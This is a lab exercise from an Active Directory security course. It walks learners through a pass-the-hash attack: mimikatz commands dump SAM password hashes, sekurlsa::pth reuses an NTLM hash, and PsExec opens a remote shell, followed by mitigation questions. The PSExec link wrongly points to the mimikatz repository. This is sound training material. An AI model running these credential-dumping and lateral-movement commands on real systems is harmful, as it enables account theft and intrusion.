# Exercise 2 - NTLM (Pass-the-Hash)

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
- PSExec: [http://live.sysinternals.com/](https://github.com/gentilkiwi/mimikatz)

## Exercise

In this exercise, we'll execute a Pass-the-Hash attack through the local Administrator account. Remember (see Lab Setup Guide) that we set the same local admin password on adsec-00 as well as on adsec-01. Therefore the NTLM hashes are the same on both computers.

Open a command prompt with admin rights (right-click "Run as Administrator") and start mimikatz.

```
cd C:\attacker-tools
.\mimikatz_trunk\x64\mimikatz.exe
```

Run the following commands inside mimikatz to extract the password hashes of the **local** user accounts.

```
privilege::debug
token::elevate
lsadump::sam
```

Next, we use the PTH-function in mimikatz to start a shell with the hash of the local admin account (RID 500).

```
sekurlsa::pth /user:adminuser /ntlm:7dfa0531d73101ca080c7379a9bff1c7 /domain:doesnotmatter
```

Finally, connect to adsec-01 using psexec.

```
cd C:\attacker-tools
.\PsExec64.exe \\adsec-01 cmd
```

Make sure everything worked as expected

```
whoami
hostname
```

## Questions

- What is the purpose of the mimikatz commands "privilege::debug" and "token::elevate"? Why do you need to execute them?
- Log on to adsec-01 as Bruce Lee. Use what you learned above and help john to remotely extract Bruce Lees NTLM hash from memory. `Note:` "lsadump::sam" only dumps the local password database. You need to use a different command to extract data from memory.
- Do research on the internet on how to best mitigate pass-the-hash attacks. Describe the mitigation techniques that you think are the best and explain why you chose them.
- Is it possible (and feasible) to just disable NTLM at all? Explain your reasoning.